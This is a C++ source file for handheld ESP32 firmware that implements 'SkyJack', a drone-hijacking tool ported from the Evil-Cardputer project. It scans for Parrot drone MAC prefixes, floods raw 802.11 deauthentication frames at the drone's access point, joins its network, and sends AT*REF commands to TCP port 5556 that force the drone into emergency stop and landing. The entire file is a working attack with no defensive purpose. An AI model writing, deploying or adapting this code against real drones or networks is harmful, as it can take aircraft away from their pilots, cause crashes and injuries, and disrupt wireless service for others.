/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * Parrot OUI scan, deauth, connect, AT emergency/land.
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#include "skyjack.h"
#if defined(EVIL_EXTENSIONS)
#include "root/net/wifi_common.h"
#include "root/ui/display.h"
#include <WiFi.h>
#include <WiFiClient.h>
#include <esp_wifi.h>
#include <globals.h>

namespace {

bool parrotOui(const String &bssid) {
    return bssid.startsWith("90:03:B7") || bssid.startsWith("00:26:7E") || bssid.startsWith("A0:14:3D") ||
           bssid.startsWith("90:03:b7") || bssid.startsWith("00:26:7e") || bssid.startsWith("a0:14:3d");
}

void parseMac(const String &s, uint8_t mac[6]) {
    unsigned int b[6] = {0};
    sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]);
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)b[i];
}

void sendDeauth(const uint8_t ap[6], uint8_t ch) {
    uint8_t frame[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                         0,    0,    0,    0,    0,    0,    0,    0,    0,    0,
                         0,    0,    0,    0,    0xf0, 0xff};
    memcpy(frame + 10, ap, 6);
    memcpy(frame + 16, ap, 6);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 30; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        delay(10);
    }
}

void sendAt(WiFiClient &c, const char *cmd) {
    static int seq = 1;
    String line = "AT*REF=" + String(seq++) + "," + String(cmd) + "\r";
    c.print(line);
}

} // namespace

void skyjackMenu() {
    drawMainBorderWithTitle("SkyJack");
    displayTextLine("Scanning ch 1-13...");
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    delay(80);

    String ssid, bssid;
    int channel = -1;
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
        if (parrotOui(WiFi.BSSIDstr(i))) {
            ssid = WiFi.SSID(i);
            bssid = WiFi.BSSIDstr(i);
            channel = WiFi.channel(i);
            break;
        }
    }
    WiFi.scanDelete();
    if (channel < 0) {
        displayError("No Parrot OUI", true);
        return;
    }
    displayInfo("Drone " + ssid + "\n" + bssid + " ch" + String(channel), true);

    uint8_t ap[6];
    parseMac(bssid, ap);
    sendDeauth(ap, (uint8_t)channel);

    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid.c_str());
    unsigned long t0 = millis();
    while (millis() - t0 < 6000 && WiFi.status() != WL_CONNECTED) delay(200);
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Connect failed", true);
        return;
    }

    WiFiClient client;
    if (client.connect("192.168.1.1", 5556)) {
        for (int i = 0; i < 5; i++) {
            sendAt(client, "290717952");
            delay(50);
            sendAt(client, "290717696");
            delay(50);
        }
        client.stop();
        displayInfo("AT EMERGENCY+LAND sent", true);
    } else displayError("Drone TCP 5556 fail", true);
    WiFi.disconnect(true);
}
#endif
